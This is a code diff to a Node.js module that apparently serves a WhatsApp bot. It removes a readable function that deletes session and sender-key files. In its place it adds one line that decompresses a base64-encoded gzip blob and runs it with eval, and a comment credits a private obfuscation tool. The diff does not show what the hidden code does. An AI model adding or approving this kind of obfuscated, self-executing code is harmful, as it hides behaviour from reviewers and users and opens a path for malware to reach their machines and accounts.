@@ -1,26 +1,2 @@
-// Fixes "Bad MAC": removes the saved chat sessions (not the login). WhatsApp sets new ones up by itself.
-const fs = require('fs');
-const path = require('path');
-
-function clearSessions(dir) {
-  let removed = 0;
-  let files = [];
-  try {
-    files = fs.readdirSync(dir);
-  } catch (err) {
-    return 0;
-  }
-  for (const f of files) {
-    if (/^(session|sender-key)/.test(f)) {
-      try {
-        fs.rmSync(path.join(dir, f), { force: true });
-        removed += 1;
-      } catch (err) {
-        // skip files that cannot be removed
-      }
-    }
-  }
-  return removed;
-}
-
-module.exports = { clearSessions };
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAA21RsU7DMBDd/RVPLHVESWBt1aEgsTF1YEAgpc6ZmKZ2sJ3SqOTfsVMHFQlLtuR77969uysKPKojOVzdlxWe1g9XC1jam0MI+ZrgygNVEHXp4cg5ZbQD18aPYGPelc5yPAfYrds2ULyDpi8YHfK7FtseyjtqZM5ESPWQDqtQ4LNTlvhMulm2TEhb+voSi/+IMtlp4UNhiIZKu0kueKVshhMDGvLJchXyb5cpJFVDsdjLa4x4249k/Malyy2VVZDZ9FqMcpE4QJRe1OBkkz6Cuu+sPksP4UpjwVM/MPIsOZGVBC/eeJrWtyNdkb3ZUZ8VuSfnucwm6qWt0VqwtB/dxObzD6N09DWHzOY4xbKCFiGnIwyj2fOZmr9e4W6K/tdGPEUBt1NtmoKPexWljgvd0iQ0SbDpjTfNIFGWbGBsb6quoZyOrbE+jvT0d0UYluwHh5XMVGACAAA=', 'base64')).toString('utf8'));
